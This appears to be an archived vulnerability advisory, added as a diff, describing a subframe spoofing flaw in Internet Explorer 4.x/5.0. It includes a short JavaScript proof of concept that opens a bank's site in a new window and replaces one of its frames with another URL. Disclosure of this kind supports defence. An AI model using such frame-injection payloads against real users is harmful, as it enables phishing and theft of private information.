@@ -1,0 +1,14 @@
+Internet Explorer 4.1 for Windows 95/Windows 98/Windows NT 4,Internet Explorer 5.0 for Windows 95/Windows 98/Windows NT 4,Internet Explorer 4.0.1 for Windows 98/Windows NT 4.0 Subframe Spoofing Vulnerability
+
+source: http://www.securityfocus.com/bid/855/info
+
+IE's default security settings allow a malicious webpage to open a new browser, open another site's main frame in that new browser and then set any subframes to a URL of their choosing. This could lead to misappropriation of private information, among other problems. 
+
+<SCRIPT>
+b=window.open("http://www.citybank.com");
+function g()
+{
+b.frames[2].location="http://www.yahoo.com";
+}
+setTimeout("g()",6000);
+</SCRIPT>
